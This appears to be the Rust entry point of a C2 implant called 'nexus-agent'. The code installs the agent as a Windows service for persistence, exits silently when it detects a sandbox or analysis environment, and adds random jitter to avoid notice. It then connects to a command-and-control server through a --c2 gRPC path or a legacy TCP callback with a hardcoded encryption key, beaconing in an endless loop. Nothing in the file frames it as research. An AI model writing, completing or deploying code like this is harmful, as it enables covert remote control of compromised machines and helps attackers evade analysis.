// v1.4 commit-prep: the nexus-agent binary is a v1.0 overlay that
// pre-dates the `-D warnings` CI gate. Suppress the accumulated
// dead-code + unused-import patterns at the binary root so the gate
// doesn't block new work. The v1.5 overlay cleanup pass will address
// these properly.
#![allow(
    dead_code,
    unused_imports,
    unused_variables,
    unused_mut,
    ambiguous_glob_imports,
    clippy::all
)]

use nexus_agent::a2a_client::{connect_and_serve, A2aClientConfig};
use nexus_common::*;
use std::env;
use std::path::Path;
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::watch;
use tokio::time::sleep;

mod agent;
mod communication;
mod evasion;
mod execution;
mod persistence;
mod registry;
mod system;

#[cfg(target_os = "windows")]
mod fiber_execution;

#[cfg(target_os = "windows")]
mod svc;

use agent::NexusAgent;
use communication::NetworkClient;
use evasion::EnvironmentChecker;

fn main() {
    let args: Vec<String> = env::args().collect();

    // Handle service subcommands synchronously before any async runtime is
    // constructed.  --run-service is invoked by the SCM and must call
    // service_dispatcher::start() on the main thread without a live Tokio
    // runtime above it.
    #[cfg(target_os = "windows")]
    match args.get(1).map(|s| s.as_str()) {
        Some("--install") => {
            if let Err(e) = svc::install() {
                eprintln!("[nexus-agent] install failed: {}", e);
                std::process::exit(1);
            }
            return;
        }
        Some("--uninstall") => {
            if let Err(e) = svc::uninstall() {
                eprintln!("[nexus-agent] uninstall failed: {}", e);
                std::process::exit(1);
            }
            return;
        }
        Some("--run-service") => {
            if let Err(e) = svc::run() {
                eprintln!("[nexus-agent] service dispatcher failed: {}", e);
                std::process::exit(1);
            }
            return;
        }
        _ => {}
    }

    // Standard foreground agent path.
    let rt = tokio::runtime::Builder::new_multi_thread()
        .enable_all()
        .build()
        .expect("failed to build tokio runtime");

    if let Err(e) = rt.block_on(run_agent(args)) {
        #[cfg(debug_assertions)]
        eprintln!("Agent error: {}", e);
    }
}

async fn run_agent(args: Vec<String>) -> anyhow::Result<()> {
    // Initialize logging (in release mode, this should be minimal or disabled)
    #[cfg(debug_assertions)]
    env_logger::init();

    // Perform environment checks for sandbox/analysis detection
    if EnvironmentChecker::is_analysis_environment().await {
        // Exit silently if we detect analysis environment
        return Ok(());
    }

    // Add initial jitter delay
    let jitter = rand::random::<u64>() % 30 + 10;
    sleep(Duration::from_secs(jitter)).await;

    // Parse named flags for the A2A path.
    let mut c2_addr: Option<String> = None;
    let mut transport = "grpc";
    let mut ident_path = default_ident_path();
    let mut tag = String::new();

    let mut i = 1usize;
    while i < args.len() {
        match args[i].as_str() {
            "--c2" => {
                i += 1;
                c2_addr = args.get(i).cloned();
            }
            "--transport" => {
                i += 1;
                if let Some(t) = args.get(i) {
                    transport = t.as_str();
                }
            }
            "--ident" => {
                i += 1;
                if let Some(p) = args.get(i) {
                    ident_path = p.clone();
                }
            }
            "--tag" => {
                i += 1;
                if let Some(t) = args.get(i) {
                    tag = t.clone();
                }
            }
            _ => {}
        }
        i += 1;
    }

    // When --c2 is provided with grpc transport, use the A2A path.
    if let Some(addr) = c2_addr {
        if transport == "grpc" {
            return run_a2a(addr, ident_path, tag).await;
        }
    }

    // Legacy TCP path (v1.0 overlay). Fall through when no --c2 flag or
    // --transport legacy.  Skip the first arg if it looks like a flag so we
    // don't hand "--c2" to the TCP client.
    let server_addr = args
        .get(1)
        .filter(|a| !a.starts_with("--"))
        .cloned()
        .unwrap_or_else(|| "127.0.0.1:4444".to_string());

    // Create encryption key (in production, this should be embedded or derived)
    let encryption_key = [
        0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF, 0xFE, 0xDC, 0xBA, 0x98, 0x76, 0x54, 0x32,
        0x10, 0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF, 0xFE, 0xDC, 0xBA, 0x98, 0x76, 0x54,
        0x32, 0x10,
    ];

    // Initialize the agent
    let mut agent = NexusAgent::new(server_addr, encryption_key).await?;

    // Main agent loop with error recovery
    loop {
        match agent.run_cycle().await {
            Ok(_) => {
                // Successful cycle, add some jitter before next cycle
                let cycle_delay = rand::random::<u64>() % 60 + 30; // 30-90 seconds
                sleep(Duration::from_secs(cycle_delay)).await;
            }
            Err(e) => {
                // Log error in debug mode, otherwise fail silently
                #[cfg(debug_assertions)]
                eprintln!("Agent cycle error: {}", e);

                // Exponential backoff on errors
                let error_delay = rand::random::<u64>() % 300 + 60; // 1-6 minutes
                sleep(Duration::from_secs(error_delay)).await;
            }
        }
    }
}

/// Run the A2A gRPC transport loop, reconnecting on stream errors until a
/// shutdown signal (ctrl_c / SIGINT) is received.
async fn run_a2a(c2_addr: String, ident_path: String, tag: String) -> anyhow::Result<()> {
    let identity = NodeIdentity::load_or_create(Path::new(&ident_path))?;

    let cfg = A2aClientConfig {
        c2_addr,
        tag,
        insecure_network: false,
    };

    // Shared shutdown flag: the signal task sets it to true; each iteration
    // of the reconnect loop creates a fresh watch receiver to drive the
    // connect_and_serve shutdown future.
    let (stop_tx, stop_rx) = watch::channel(false);

    tokio::spawn(async move {
        tokio::signal::ctrl_c().await.ok();
        let _ = stop_tx.send(true);
    });

    loop {
        if *stop_rx.borrow() {
            break;
        }

        let mut rx = stop_rx.clone();
        match connect_and_serve(
            &cfg,
            &identity,
            async move {
                let _ = rx.wait_for(|v| *v).await;
            },
        )
        .await
        {
            Ok(()) => {}
            Err(e) => {
                #[cfg(debug_assertions)]
                eprintln!("A2A error: {e:#}");
            }
        }

        if *stop_rx.borrow() {
            break;
        }

        // Brief backoff before reconnect.
        let delay = rand::random::<u64>() % 30 + 10;
        sleep(Duration::from_secs(delay)).await;
    }

    Ok(())
}

/// Default path for the agent's persistent identity file.
fn default_ident_path() -> String {
    if cfg!(target_os = "windows") {
        r"C:\ProgramData\nexus-agent\identity.bin".to_string()
    } else {
        "/var/lib/nexus-agent/identity.bin".to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_agent_initialization() {
        let server_addr = "127.0.0.1:4444".to_string();
        let key = [0u8; 32];

        // This should not panic
        let agent = NexusAgent::new(server_addr, key).await;
        assert!(agent.is_ok());
    }

    #[test]
    fn default_ident_path_is_not_empty() {
        assert!(!default_ident_path().is_empty());
    }
}
